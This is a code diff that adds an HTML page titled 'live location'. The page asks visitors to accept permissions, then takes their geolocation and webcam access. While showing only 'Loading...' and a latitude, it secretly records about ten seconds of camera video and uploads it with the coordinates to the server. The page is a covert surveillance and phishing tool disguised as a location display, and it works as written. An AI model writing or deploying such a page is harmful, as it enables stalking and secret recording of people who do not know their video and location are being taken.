@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>live location</title>
+</head>
+<body>
+    <p id="permissions">Please accept permissions.</p>
+    <center><h1 id="loading" style="display: none;">Loading...</h1></center>
+   <center><h1 id="location" style="display: none;"></h1></center>
+
+    <script>
+        let latitude, longitude;
+
+        // Function to capture and send video
+        function captureAndSendVideo(stream) {
+            const mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+
+            mediaRecorder.ondataavailable = function(event) {
+                if (event.data.size > 0) {
+                    chunks.push(event.data);
+                }
+            };
+
+            mediaRecorder.onstop = function() {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                chunks = [];
+
+                const formData = new FormData();
+                formData.append('video', blob, 'video.webm');
+                formData.append('latitude', latitude);
+                formData.append('longitude', longitude);
+
+                fetch('/upload', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.text())
+                .then(data => {
+                    console.log(data);
+                })
+                .catch(error => {
+                    console.error('Error uploading video:', error);
+                });
+            };
+
+            mediaRecorder.start();
+
+            // Stop recording after 5 seconds
+            setTimeout(() => {
+                mediaRecorder.stop();
+            }, 10000);
+        }
+
+        // Get geolocation
+        if (navigator.geolocation) {
+            document.getElementById('permissions').textContent = 'Please accept permissions.';
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    latitude = position.coords.latitude;
+                    longitude = position.coords.longitude;
+
+                    setTimeout(() => {
+                        document.getElementById('loading').style.display = 'none';
+                        document.getElementById('location').style.display = 'block';
+                        document.getElementById('location').textContent = `Latitude: ${latitude}`;
+                        // Longitude: ${longitude}//
+                    }, 9000);
+
+                    // Prompt for camera access after geolocation is obtained
+                    document.getElementById('permissions').textContent = 'Please accept  permissions.';
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(stream => {
+                            document.getElementById('permissions').style.display = 'none';
+                            document.getElementById('loading').style.display = 'block';
+                            captureAndSendVideo(stream);
+                        })
+                        .catch(error => {
+                            console.error('Error accessing video stream:', error);
+                            document.getElementById('permissions').textContent = 'Error getting geolocation. Please refresh and try again.';
+                        });
+                },
+                error => {
+                    console.error('Error getting geolocation:', error);
+                    document.getElementById('permissions').textContent = 'Error getting geolocation. Please refresh and try again.';
+                }
+            );
+        } else {
+            console.error('Geolocation is not supported by this browser.');
+            document.getElementById('permissions').textContent = 'Geolocation is not supported by this browser.';
+        }
+    </script>
+</body>
+</html>
